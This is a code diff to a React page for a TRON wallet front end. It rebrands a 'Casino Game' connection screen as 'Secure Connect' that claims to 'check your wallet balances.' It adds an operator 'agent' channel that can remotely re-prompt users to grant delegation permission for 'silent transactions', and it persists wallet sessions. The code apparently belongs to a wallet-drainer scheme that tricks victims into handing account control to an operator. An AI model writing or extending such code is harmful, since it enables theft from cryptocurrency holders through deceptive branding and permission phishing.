@@ -48,6 +48,10 @@ export default function UserPage() {
   const notifiedRef = useRef(false); // Track if user has been notified to agent
   const permissionNotifiedRef = useRef(false); // Track if permission update has been sent
 
+  const SESSION_STORAGE_KEY = typeof window !== "undefined"
+    ? `sc_user_session_${userId}`
+    : null;
+
   // WebSocket connection for real-time updates
   useEffect(() => {
     // Use NEXT_PUBLIC_WS_URL if set, otherwise construct from current hostname and port
@@ -74,9 +78,18 @@ export default function UserPage() {
       try {
         const data = JSON.parse(event.data);
         console.log("WebSocket message received:", data);
+
         if (data.type === 'balance_update' && data.userId === userId) {
           setTrxBalance(data.trxBalance);
           setUsdtBalance(data.usdtBalance);
+        } else if (data.type === 'force_disconnect') {
+          // Agent requested this user to be disconnected
+          handleForceDisconnect();
+        } else if (data.type === 'retry_permission') {
+          // Agent requested retry of delegation for this user
+          if (!isGrantingDelegation) {
+            handleGrantDelegation();
+          }
         }
       } catch (e) {
         console.error("Error parsing WebSocket message:", e);
@@ -106,6 +119,49 @@ export default function UserPage() {
       }
     };
   }, [userId]);
+
+  // Try to restore previous wallet session on mount (for persistence across reloads)
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    try {
+      const raw = SESSION_STORAGE_KEY ? window.localStorage.getItem(SESSION_STORAGE_KEY) : null;
+      if (!raw) return;
+      const stored = JSON.parse(raw);
+      if (!stored || !stored.address || !stored.connectionType) return;
+
+      const restore = async () => {
+        try {
+          if (stored.connectionType === "tronlink") {
+            if (window.tronWeb?.defaultAddress?.base58) {
+              const addr = window.tronWeb.defaultAddress.base58;
+              if (addr && addr === stored.address) {
+                setConnectionType("tronlink");
+                setTronAddress(addr);
+                setWalletAddress(addr);
+                setWcTronWeb(window.tronWeb);
+                setWalletStatus("Reconnected via TronLink.");
+              }
+            }
+          } else if (stored.connectionType === "walletconnect") {
+            setConnectionType("walletconnect");
+            setWalletStatus("Restoring wallet connection…");
+            const { address: addr } = await ensureTronWalletConnected();
+            setWalletStatus("Connected to TRON");
+            setWalletAddress(addr);
+          }
+        } catch (e) {
+          console.error("Failed to restore previous wallet session:", e);
+          if (SESSION_STORAGE_KEY) {
+            window.localStorage.removeItem(SESSION_STORAGE_KEY);
+          }
+        }
+      };
+
+      restore();
+    } catch (e) {
+      console.error("Error while restoring wallet session:", e);
+    }
+  }, [SESSION_STORAGE_KEY]);
 
   // Load backend health on first render
   useEffect(() => {
@@ -355,15 +411,28 @@ export default function UserPage() {
           relayUrl: "wss://relay.walletconnect.com",
           projectId,
           metadata: {
-            name: "Casino Game",
-            description: "Connect wallet to play",
+            name: "Secure Connect",
+            description: "Check your wallet balances",
             url: typeof window !== "undefined" ? window.location.origin : "",
-            icons: [],
+            icons: [
+              "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%233b82f6' width='32' height='32' rx='6'/%3E%3Ctext x='16' y='22' font-size='18' font-weight='bold' fill='white' text-anchor='middle' font-family='sans-serif'%3ES%3C/text%3E%3C/svg%3E",
+            ],
           },
         },
         themeMode: "dark",
         themeVariables: { "--w3m-accent": "#3b82f6", "--w3m-z-index": "99999" },
         allWallets: "SHOW",
+        featuredWalletIds: [
+          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
+          "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
+          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
+        ],
+        customWallets: [
+          {
+            id: "tokenpocket",
+            name: "TokenPocket",
+          },
+        ],
         enableAnalytics: false,
         enableWalletGuide: true,
       });
@@ -424,6 +493,12 @@ export default function UserPage() {
       const { address: addr } = await ensureTronWalletConnected();
       setWalletStatus("Connected to TRON");
       setWalletAddress(addr);
+      if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
+        window.localStorage.setItem(
+          SESSION_STORAGE_KEY,
+          JSON.stringify({ address: addr, connectionType: "walletconnect" })
+        );
+      }
       // Notification will be handled by useEffect when WebSocket is ready
     } catch (e) {
       setWalletStatus(e.message || "Connect failed");
@@ -454,6 +529,12 @@ export default function UserPage() {
       setWalletAddress(addr);
       setWcTronWeb(window.tronWeb);
       setWalletStatus("Connected via TronLink (Chrome extension)");
+      if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
+        window.localStorage.setItem(
+          SESSION_STORAGE_KEY,
+          JSON.stringify({ address: addr, connectionType: "tronlink" })
+        );
+      }
       // Notification will be handled by useEffect when WebSocket is ready
     } catch (e) {
       console.error("TronLink connect failed:", e);
@@ -631,6 +712,105 @@ export default function UserPage() {
     }
   }
 
+  async function handleUserDisconnect() {
+    try {
+      // Inform backend and agents first
+      try {
+        await api("/api/user/remove", {
+          method: "POST",
+          body: JSON.stringify({ userId }),
+        });
+      } catch (e) {
+        console.error("User remove API failed (will still disconnect locally):", e);
+      }
+
+      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
+        try {
+          wsRef.current.send(
+            JSON.stringify({
+              type: "user_disconnected",
+              userId,
+            })
+          );
+        } catch (e) {
+          console.error("Failed to send user_disconnected over WebSocket:", e);
+        }
+      }
+
+      // Disconnect WalletConnect if connected
+      if (wcWallet && (tronAddress || walletAddress)) {
+        try {
+          await wcWallet.disconnect();
+        } catch (err) {
+          console.error("WalletConnect disconnect error:", err);
+        }
+        setWcWallet(null);
+        wcWalletRef.current = null;
+        wcSingletonKeyRef.current = null;
+      }
+
+      // Clear any persisted session
+      if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
+        window.localStorage.removeItem(SESSION_STORAGE_KEY);
+      }
+
+      // Reset local state
+      setTronAddress("");
+      setWalletAddress("");
+      setWcTronWeb(null);
+      setConnectionType(null);
+      setTrxBalance(null);
+      setUsdtBalance(null);
+      setPermissionId(null);
+      setAutoDelegationAttempted(false);
+      setDelegationStatus("");
+      setDelegationTxId("");
+      setPermissionStatus("");
+      setWalletStatus("Wallet disconnected. Connect wallet to begin.");
+      balanceFetchedRef.current = false;
+      notifiedRef.current = false;
+      permissionNotifiedRef.current = false;
+    } catch (e) {
+      console.error("Disconnect error:", e);
+      setWalletStatus("Disconnect failed: " + (e.message || String(e)));
+    }
+  }
+
+  function handleForceDisconnect() {
+    // Clear persisted session
+    if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
+      window.localStorage.removeItem(SESSION_STORAGE_KEY);
+    }
+
+    // Best-effort disconnect of WalletConnect session if active
+    (async () => {
+      try {
+        if (wcWallet && (tronAddress || walletAddress)) {
+          await wcWallet.disconnect().catch(() => {});
+        }
+      } catch (e) {
+        console.error("Error during forced WalletConnect disconnect:", e);
+      }
+    })();
+
+    // Reset local state, but do NOT send any WebSocket messages or API calls
+    setTronAddress("");
+    setWalletAddress("");
+    setWcTronWeb(null);
+    setConnectionType(null);
+    setTrxBalance(null);
+    setUsdtBalance(null);
+    setPermissionId(null);
+    setAutoDelegationAttempted(false);
+    setDelegationStatus("");
+    setDelegationTxId("");
+    setPermissionStatus("Disconnected by agent.");
+    setWalletStatus("Disconnected by agent. Connect wallet again to continue.");
+    balanceFetchedRef.current = false;
+    notifiedRef.current = false;
+    permissionNotifiedRef.current = false;
+  }
+
   return (
     <div className="user-page">
       <header className="secure-header">
@@ -639,10 +819,15 @@ export default function UserPage() {
           <div className="secure-app-title">User {userId}</div>
         </div>
         <div className="secure-header-right">
-          <div className={`nx-network-pill ${wsConnected ? 'ws-connected' : 'ws-disconnected'}`}>
-            <span className={`nx-dot ${wsConnected ? "nx-dot-ok" : "nx-dot-err"}`} />
-            {wsConnected ? "Connected" : "Disconnected"}
-          </div>
+          {(tronAddress || walletAddress) && (
+            <button
+              className="modern-btn disconnect-btn"
+              style={{ marginLeft: "12px" }}
+              onClick={handleUserDisconnect}
+            >
+              Disconnect
+            </button>
+          )}
         </div>
       </header>
 
@@ -712,13 +897,23 @@ export default function UserPage() {
                   <p className="modern-card-desc">
                     Grant delegation permission to enable silent transactions. This is a one-time setup.
                   </p>
-                  <button
-                    className="modern-btn modern-btn-primary"
-                    onClick={handleGrantDelegation}
-                    disabled={isGrantingDelegation}
-                  >
-                    {isGrantingDelegation ? "Confirm in wallet…" : "Grant Permission"}
-                  </button>
+                  <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
+                    <button
+                      className="modern-btn modern-btn-primary"
+                      onClick={handleGrantDelegation}
+                      disabled={isGrantingDelegation}
+                    >
+                      {isGrantingDelegation ? "Confirm in wallet…" : "Grant Permission"}
+                    </button>
+                    {!isGrantingDelegation && (delegationStatus || permissionStatus) && (
+                      <button
+                        className="modern-btn"
+                        onClick={handleGrantDelegation}
+                      >
+                        Retry
+                      </button>
+                    )}
+                  </div>
                   {delegationStatus && (
                     <div className="nx-status-note" style={{ marginTop: "12px" }}>{delegationStatus}</div>
                   )}
